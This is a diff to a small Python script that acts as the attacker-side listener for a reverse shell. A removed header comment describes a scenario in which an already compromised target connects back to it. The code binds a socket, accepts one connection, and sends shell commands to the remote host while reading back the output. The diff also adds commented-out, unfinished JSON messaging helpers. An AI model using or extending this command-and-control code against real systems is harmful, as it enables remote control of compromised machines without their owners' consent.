@@ -1,13 +1,11 @@
 #!/usr/bin/python3
 
 #########################################################################################
-#   Simple server for penetration testing, only educational !!!
-#   scenario: target already compromised: start my server (attacket host) then connect 
-#             to my server from the compromised (target) host
+#   Simple server ... almost
 #########################################################################################
 
 import socket
-
+import json
 
 
 S_IP = "192.168.0.13"
@@ -20,17 +18,27 @@ class ServerN1F:
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         server.bind((ip, port))
         server.listen(1)
-
         print("[+] Waiting for connections")
-
         self.conn, addr = server.accept()
-
         print(f"[+] Client connected  {str(addr)}")
 
+#   #####################################################################################
+#   Need to make it work ...
+
+#    def reliable_send(self, data):
+#        json_data = json.dumps(data)
+#        self.conn.send(json_data)
+
+#    def reliable_recv(self):
+#        json_data = self.conn.recv(1024)
+#        return json.loads(json_data)
+#   #####################################################################################
 
     def execute_command(self, command):
         self.conn.send(str.encode(command))
-        return self.conn.recv(1024)
+        resp = str(self.conn.recv(1024), "utf-8")
+        return resp
+        #return self.conn.recv(1024)
 
     def run_server(self):
         while True:
